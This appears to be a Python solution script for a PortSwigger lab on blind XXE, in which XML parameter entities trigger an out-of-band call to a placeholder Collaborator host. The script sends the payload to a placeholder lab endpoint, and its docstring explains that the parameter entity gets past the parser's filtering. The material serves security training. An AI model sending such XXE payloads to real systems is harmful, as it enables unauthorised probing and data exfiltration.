"""
Lab 4: Blind XXE with out-of-band interaction via XML parameter entities
https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction-using-parameter-entities
Difficulty: Practitioner

📝 This app's parser strips/rejects regular entity references used in the
document body — switch to a parameter entity (%xxe;), defined and
referenced entirely WITHIN the DTD, to dodge that filtering.
"""

from utils import get_session, log, note, build_parameter_entity_oob

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"
STOCK_CHECK_PATH = "/product/stock"
COLLABORATOR_URL = "http://YOUR-COLLABORATOR-ID.oastify.com"


def run():
    s = get_session()

    xml = build_parameter_entity_oob(COLLABORATOR_URL)
    note(f"Payload:\n{xml}")
    note("Note there's no &xxe; anywhere in the body — only %xxe; inside the DTD.")

    r = s.post(f"{TARGET}{STOCK_CHECK_PATH}", data=xml.encode(),
                headers={"Content-Type": "application/xml"})
    log(f"Response status: {r.status_code}")

    note("Check Burp Collaborator for the interaction, as in Lab 3.")


if __name__ == "__main__":
    run()
